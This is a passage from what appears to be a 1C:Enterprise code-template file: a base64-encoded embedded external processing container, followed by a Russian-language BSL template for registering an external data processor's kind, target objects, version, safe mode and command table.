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
khI42mBt9tPqeqfVYQ+nLD1adg2SFYWKrQP7HCHkyDEVSjGuMvtU1qLxYroDfQKK
WZEgdZ8go56uobrz4bnMbYd0T2VbIZ/JtkI+lvntkP6pbCvkM9lWSP+oPc1dR621
/AcNCjAwMDAwMDYwIDAwMDAwMDYwIDdmZmZmZmZmIA0KkL+6W2NDAgCQv7pbY0MC
AAAAAABlADEAMwAwAGMANwAxAGMALQAwADcAMAA4AC0ANAAxADYANgAtAGEAMAA5
ADAALQAyADMAMABiADgAMAA0AGYANABlAGQANwAAAAAADQowMDAwMDFmMCAwMDAw
MDIwMCA3ZmZmZmZmZiANCo1TTWodMQzeB3KH8NYWyLZk2cexLPsAha7Cg0LbVbeB
9gA9QKCFtA2hV5h3kl6hevP6s2gX8cwIy0ifJH/f/Hj8fhvD9dXtjBmHxAEoWIFi
KdCxIaSMWpEWTZNj2ENHrjnOUcGqMdBqGWpPCVbT1SdKTrLOcXswhZQzoTUCKdMc
uQ1ow10etmpn7g4eeqTe4hjQYxagNgyqpgKTSynSe5Qxz3B4NumCjkEtk64q0EwX
kLJAz8VgFlVvnL3LdgyH7f12v306vTq93h62b76/8+9pezq9O73dPvjZR/e/bo/b
/eGCfHjx8vBv2s32+W/ezfZle7g5vfmT6XUO3pI/vxb8x/xex+urY0gWJbEoCEsH
Eis+M5Iz0FRGmSRCO+hzAAPtN6NjLrQI2GqEGB1Sm1YPZVTnpje24MEemq3PjrFA
8Wrg9BI04gwxSYtOQlqzON+UYjHjCSPZucnFoCsisAraSnMy5x3PWHGyM5zYGSCM
Z5pzgVVcWH1Z7SUFft7Q2RKlpd0ltTIQ+QQdaYCSN8U0dKQWRuGOqARTCgJZ66DT
XZYxfCZXVophieba1cW5smvV0nKFmZthFltCzimHgnXk7KdrxgjUvVJXWa4qGyqz
SY2yzziHC4unX4F0/0lMfOcSg8I1ovTS2lhhJ/fy/gQAAAAAAAAAAAAAAAAAAAAA
DQowMDAwMDA2MCAwMDAwMDA2MCA3ZmZmZmZmZiANCpC/ultjQwIAkL+6W2NDAgAA
AAAAZgA3AGIAMwA4AGEAYgAyAC0AZgBmADMANQAtADQAZAAyAGYALQBhADEAZABm
AC0AYQBjAGQAZAAxADkAMgAwADUAMwAyADMAAAAAAA0KMDAwMDAwY2QgMDAwMDAy
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
SPQSOV5VjzdDPa1RDOJOSe/0SGzgHum48b/2Rl29UedmsG7eHiAOBKLwbw20PQ21
5+D7fl0q7I3VM8jmhzC+C3vno6i9jvaPdf50wM7/CMG/vM7fGRjV5+DPX1fCYLuE
9IlmE6eoTFbGaXScfG5S1IrLolrZOL9cmiqQAQ3O4KEj8eZONSj7gT9TqZSqxfX/
l9hlCguEJbunO9rjgVHJxihZ/uqQL+6YRn6ev+GhkRFjtLJe3ygur1SNS/Iy9NuE
543on+plkOgrpE8MH7cfaVrY1j9UB4Zv9Qnic3Vc+BIW6SewZD/R1Xr3ihH9RyWC
mOYw+k5TvlY9lhHtGzD9MBl5rta1yhTxoZDulYG1bsaiFpDsw8SD9m7MqaWa6CTH
PFcnlO3PIIc8bD81YsWex6whscBwSw+pu30t02h/BKMHSWp6qpKNoTv0j3WeeanJ
rlWrG0Vvq1qslA3zCjbGyyo9CvVdlIxLo6PG9UU1cDkW2GmFezmlqkLH/1Y9NtRB
KqgBr10gfhW1rmoeK9Xq+ubVkRG5EYCYWiAra2uV8uaVysbySKkog/JmsDni1UdA
6EgpWBYlWfEDNfNnAsfw0EWAgT4c1uZ8qnChD3WSFP4EzH0F7+xpX9JSt3fV/N9E
z3R7d6Bzv27xhoeiL1X8tcdeQGAeKGR0HRdd6mK4Bw6/EP1VB3DfSNqnzDE2xLMF
xAA1eHcKivGBgRWxegw8ACUXLkCBaUUvISoANwUkiN0HRi6ndsi53O+UlL/rmvME
yH6EPJKRd4I42B6dhzTzbNLAuPOQZp1NGmxlj0s7gRr2Wgm13gDAsv041U0//Rso
8Kr9oL0bg6KHyWWgykw9BqsBEdivgflcJavsbyBw/Vwln2RZtCC9PUl/HTmptemH
6GfaP/H5aLdwdVTQ0zudJuAZkB12UmVLawfszuKjixmCzHqP9tVg9ysXt5a6DnJd
B5u6/VN54c86Iz7qKvGdLjM9AqCMmdjnJoIm0ocemUvEJXy1pB+6Anp7MzS7Nrj6
krsen2ycZQQffWZqa/Z5Qqr1p83MpuzUlZDY1n0kAjN18ek3VZ2PpHNTud0+UWc2
cVtzXlbjd1udPL7oic3ANq86ztbIvRvc9Oa3l/21ubqkpZq3iosT0+b2ePF6yVub
rC2NlbaWGrg4Nzc1VphZLt5rmJOjqzszSwtTeHh4SMxbZVm/Dix2tiSQidtTWN6o
1Aps0Sys3lotlO+QQmN5a2Ka319cmFopzE/WvIXrNRCFxTzfAhaFhUlLsqmSN80b
imvMcnw5GCObXnnCXhqbbCxSXr83fafi357avlt0a/4qsJyf2JLl2RqwuDtq7hTo
1Io/drMKpFU5xhtiYWrdo2ZVslLDH5urFuhkTa7NFsdvr1S9MatxtzyJg/mdkmIL
LPpxzrCt+fP3a6Cl5Y11sbBSo4HFiXazufUCXap55alGgaUGHxkJYjmwGF9bwf7t
a3ahzqmSvli36v60CyxvQiRu4cVpvuqxOyWITuLydXr39tx66hvli5ONyCjvlxZX
eyOmItJXeQjcGK/LOmdL8+NZNuveMTaKxTt9cMQGAn3fY34jY4zZ406f+XWLTdQt
CJ6sTaxe2wZ2izOzOzOLdKXkzd/MaLLSEDNHmigtTp9eBS0AH7e2Fuls8d4y/v3o
zE7NX5jahvcfgMXiwp0Vb34OLy3caRQ09rdrs3QO+2pdsInf9i7BTHI845FAru9P
itks0z2eyjwLzYlJI9H5hLOCHtVYV25J/xOA/gW2k1PPbPZgRff0s5isO/rwjk/i
jzFP/8dDpq/d1XuGx10C+vv8PQn5yUF7r93MSSB4R0Fq/hcNCjAwMDAwMDIwIDAw
MDAwMDIwIDdmZmZmZmZmIA0KkL+6W2NDAgCQv7pbY0MCAAAAAAByAG8AbwB0AAAA
AAANCjAwMDAwMDJlIDAwMDAwMjAwIDdmZmZmZmZmIA0Ke797f7WRTqqhsUGyuWGy
roG5gYWuiaGZmW6igaWBrpGxQZKFgUmaSWqKuU4tAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAANCjAwMDAwMDI2IDAwMDAwMDI2IDdmZmZmZmZmIA0K
kL+6W2NDAgCQv7pbY0MCAAAAAAB2AGUAcgBzAGkAbwBuAAAAAAANCjAwMDAwMDFj
IDAwMDAwMjAwIDdmZmZmZmZmIA0Ke797fzUvV7WRoZmOgQ6QYWFgbGikY1DLywVC
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAANCjAwMDAwMDI4IDAwMDAwMDI4IDdmZmZmZmZmIA0KkL+6W2NDAgCQv7pb
Y0MCAAAAAAB2AGUAcgBzAGkAbwBuAHMAAAAAAA0KMDAwMDAyYjkgMDAwMDAyYjkg
N2ZmZmZmZmYgDQqNVEuuHDcMvEuvmwYpUR8eRxRF4G3eBM9BgMDwybzIkXKFVGfh
9Sx60JoRiqzf/Pvrnx9yF76v6569Tzce1LsFaZcgL3gLPWXXMVsZcl8lZJQ2nEYb
i3REp+msxMN87H50DL1u2extB9OsVkiXMpm0Q0t7YdXdq9h7WN/4uo2tl+NJJ4VJ
mxSyxU59+Fw6pJjWN9HkujXMu69CvNcmndPIZmE6mjO8Twvd91WjaElflJaVVH3S
Yt3kmqc33b6LXXetImvUSrPsRuqQy88p5HXaWhK99fMe1sOztTOjjiQ2AYPCjCuL
wSD3qnlKFL8vLdIjIOYu8fDMRv7o0nxwZDmntXrdkF+LcqUcOUmTGzQ7C6RPbIcP
+S7Ws1k309g26FEImvGiZbbJeG7TFUVm3lfHqdZIyiPyuL5pOehYYOQ4NqYMuJlx
OrdNeDCzYj1kA76G1CMuewW/h/W/Zl0s6g7achTZMPCs1XEPANw5ekdqPap6zoGv
ESP1NmjVHnS6e6nc5Gx7sjF9Wi11kbWJDlRO8jFx3Cz9YOoe7b52b4vZlc7oz962
4DqObezdzVdrBVinWoID0rUVmiFyeAN0bjvpoyXov4f18EwZ4LUHiT080QfyzZvm
ziixW+p80F5//P3xmS+kHG7VWiCwIODKB3FbhmidAbbS2RMqH6m8h8CLwUiJ9I5k
GhM08cmaegKO4cri1oLaeXYcCVXKKCjaHNrR5lkxOwdSv7xQZkUXoiShAfjYEWKF
G4R9ctlzbdRNpGIi+oMk1fOo4j0zNFd5D+tRBe3l4F5IOA9UUSWfiS6fQGVkt3GQ
y6/X68/rHqqBhykFQdaEM14aAh+IQLTVz6PIX+fr+8frE9VmiTbtoDYFK1Rsu6Yu
ms+/USJxku339e/XDVcXylGp9Y1VchnNWQJdRvOH45eeP/8D
-----END CERTIFICATE-----"}
}
}
},
{0,
{"Настройка внешней обработки",0,0,"","Функция СведенияОВнешнейОбработке() Экспорт
	
	СведенияОбОбработке = Новый Структура;
	//	1. Вид - вид обработки.
	//	Тип данных - строка, допустимо одно из 6 значений.
	//	Значения.
	//	1) Глобальные - ""ДополнительнаяОбработка"", ""ДополнительныйОтчет""
	//	2) Назначаемые - ""ЗаполнениеОбъекта"", ""Отчет"", ""ПечатнаяФорма"" или ""СозданиеСвязанныхОбъектов"".
	СведенияОбОбработке.Вставить(""Вид"", ""<?""Вид обработки"", ВыборВарианта, ""Дополнительная обработка"", ""ДополнительнаяОбработка"", ""Дополнительный отчет"", ""ДополнительныйОтчет"", ""Заполнение объекта"", ""ЗаполнениеОбъекта"", ""Отчет"", ""Отчет"", ""Печатная форма"", ""ПечатнаяФорма"", ""Создание связанных объектов"", ""СозданиеСвязанныхОбъектов"">"");
	
	//	2. Назначение - объект, для которого назначается данная обработка, 
	//	Массив строк имен объектов метаданных.
	//	Примеры значений массива - ""Документ.АвансовыйОтчет"" или ""Справочник.*"", где * - означает все объекта данного вида.
	//	Для глобальных (не назначаемых) обработок параметр не имеет смысла.
	ОбъектыМетаданных = Новый Массив;                  
	ОбъектыМетаданных.Добавить(""Документ.<?""Назначение обработки"", Документ>"");
	СведенияОбОбработке.Вставить(""Назначение"", ОбъектыМетаданных);
	
	//	3. Наименование - название обработки, произвольное наименование
	//	Тип данных - произвольная строка.
	//	Данное наименование будет отображаться в списке дополнительных обработок.
	СведенияОбОбработке.Вставить(""Наименование "", ""<?""Наименование обработки"">"");
	
	//	4. Версия - номер версии обработки
	//	Тип данных - строка в формате ""ХХ.ХХ"".
	//	Обозначает версию данной обработки, данная версия будет отображаться в списке дополнительных отчетов и обработок.
	СведенияОбОбработке.Вставить(""Версия "", ""1.0"");
	
	//	5. БезопасныйРежим - режим контроля прав пользователя.
	//	Тип данных - булево.
	СведенияОбОбработке.Вставить(""БезопасныйРежим"", <?""Безопасный режим"", ВыборВарианта, ""Да"", ""Истина"", ""Нет"", ""Ложь"">);
	
	//	6. Информация - краткое описание обработки.
	//	Тип данных - строка.
	//	Данное описание будет отображаться в списке дополнительных обработок.
	СведенияОбОбработке.Вставить(""Информация"", ""<?""Информация о обработке"">"");
	
	//	7. Команды - действия предоставляемые обработкой.
	//	Тип данных - таблица значений.
	//	Таблица содержит 5 колонок:
	//	1) Представление. Наименование команды в пользовательском интерфейсе;
	//	2) Идентификатор. Для печатных форм список макетов, для остальных обработок любая строка, уникальная для данной обработки.
	//	3) Использование. Строка, одно из значений - 
	//		- ОткрытиеФормы. Открывает форму обработки.
	//		- ВызовКлиентскогоМетода. Вызов клиентского экспортного метода модуля формы
	//		- ВызовСерверногоМетода. Вызов экспортного серверного метода модуля объекта.
	//		Для внешних печатных форм нужно указывать последнее значение.
	//	4) ПоказыватьОповещение. Булево, нужно ли показывать оповещение при начале и окончании действия.
	//	5) Модификатор. Для внешних печатных форм должно содержаться значение ""ПечатьMXL"".
	ТаблицаКоманд = ПолучитьТаблицуКоманд();
	ДобавитьКоманду(ТаблицаКоманд, ""<?""Представление. Наименование команды в пользовательском интерфейсе"">"", ""<?""Идентификатор. Для печатных форм список макетов, для остальных обработок любая строка, уникальная для данной обработки."">"", ""<?""Использование"", ВыборВарианта, ""Открытие формы"", ""ОткрытиеФормы"", ""Вызов клиентского метода"", ""ВызовКлиентскогоМетода"", ""Вызов серверного метода"", ""ВызовСерверногоМетода"">"");
	СведенияОбОбработке.Вставить(""Команды"", ТаблицаКоманд);
	
	Возврат СведенияОбОбработке;
	
КонецФункции // СведенияОВнешнейОбработке()

Функция ПолучитьТаблицуКоманд()
	
	ТаблицаКоманд = Новый ТаблицаЗначений;
	ТаблицаКоманд.Колонки.Добавить(""Представление"", Новый ОписаниеТипов(""Строка""));
	ТаблицаКоманд.Колонки.Добавить(""Идентификатор"", Новый ОписаниеТипов(""Строка""));
	ТаблицаКоманд.Колонки.Добавить(""Использование"", Новый ОписаниеТипов(""Строка""));
	ТаблицаКоманд.Колонки.Добавить(""ПоказыватьОповещение"", Новый ОписаниеТипов(""Булево""));
	ТаблицаКоманд.Колонки.Добавить(""Модификатор"", Новый ОписаниеТипов(""Строка""));
	
	Возврат ТаблицаКоманд;
	
КонецФункции

Процедура ДобавитьКоманду(ТаблицаКоманд, Представление, Идентификатор, Использование, ПоказыватьОповещение = Ложь, Модификатор = """")
	
	НоваяКоманда = ТаблицаКоманд.Добавить();
	НоваяКоманда.Представление = Представление;
